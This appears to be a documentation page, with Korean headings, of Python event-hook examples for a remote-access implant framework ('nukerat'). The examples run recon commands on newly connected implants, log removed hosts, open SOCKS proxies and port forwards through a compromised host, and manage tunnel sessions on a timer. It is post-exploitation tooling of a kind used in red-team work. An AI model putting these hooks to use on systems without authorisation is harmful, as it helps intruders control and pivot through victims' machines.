## 새 임플란트에서 동기·비동기 명령 실행

```python
def format_host(host):
    user = host.get("user", "?")
    name = host.get("hostname", host["tag"])
    return f"[+] new implant: {user} @ {name}"

def on_connect(host):
    echo(format_host(host))
    cmd(host["tag"], "whoami")
    async_cmd(host["tag"], "hostname")

event.new_host:on_connect()
```

## 호스트가 제거될 때 알림

```python
import json
import os

def on_removed(host):
    path = f"/tmp/nukerat/removed/{host['tag']}.json"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(host, f, default=str)
    message_box("Host removed", host["tag"], type="info")

event.removed_host:on_removed()
```

## 새 리스너에서 SOCKS 및 포트 포워드 열기

```python
def on_listener(row):
    if row["type"] != "http":
        return
    hosts = db.hosts()
    if not hosts:
        return
    tag = hosts[0]["tag"]
    network.add_socks(tag, 1080)
    network.add_forward(tag, 8080, '127.0.0.1', 80)

event.listeners_update:on_listener()
```

## 타이머로 네트워크 세션 재시작 및 제거

```python
def manage_net(_):
    for row in db.listeners():
        if row["type"] not in ("socks", "port_forwarding"):
            continue
        echo(network.restart(row["tag"]))
        echo(network.remove(row["tag"]))
        return

event.heartbeat_60m:manage_net()
```
